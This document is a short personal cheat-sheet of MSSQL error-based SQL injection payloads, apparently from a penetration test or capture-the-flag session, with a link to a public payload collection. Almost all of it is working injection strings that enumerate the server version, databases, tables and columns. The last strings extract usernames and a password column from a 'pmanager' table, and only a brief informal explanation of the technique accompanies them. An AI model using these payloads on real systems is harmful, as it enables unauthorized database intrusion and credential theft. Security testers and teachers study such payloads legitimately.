<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-error-based>

' + convert(int,@@version) + '
' + cast((SELECT @@version) as int) + '

' + convert(int,db_name(1)) + '
' + convert(int,db_name(2)) + '
' + cast((SELECT db_name(1)) as int) + '
' + cast((SELECT db_name(2)) as int) + '

Error-based SQLI: (The hole point with error based injection is that the SQL backend will error out some information about your query that's “wrong", and by using this to our adventage we can force this logic to spit out valuable information to us.)

', cast((SELECT @@version) as int)) --
', cast((SELECT db_name(1)) as int)) --

(Note: In this case I could only really enumarate one datapoint at a time, so I had to do something like this to make it work)
', cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --
', cast((SELECT top 1 TABLE_NAME FROM master.information_schema.TABLES) as int)) --
', cast((SELECT top 1 username FROM users) as int)) --
', cast((SELECT top 1 username FROM users where username not in('eric')) as int)) --
', cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --

(Note: You can do it like this too. I might prefer this variation of syntax actually.)
1',CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES )))--
1',CONVERT(INT,(SELECT  top 1  COLUMN_NAME FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager')))--
1',CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES WHERE TABLE_NAME NOT IN ('pmanager'))))--
1',CONVERT(INT,(SELECT DISTINCT top 1 COLUMN_NAME FROM archive.information_schema.COLUMNS  WHERE TABLE_NAME='pmanager' AND column_name NOT IN ('alogin', 'id'))))
1',CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager)))--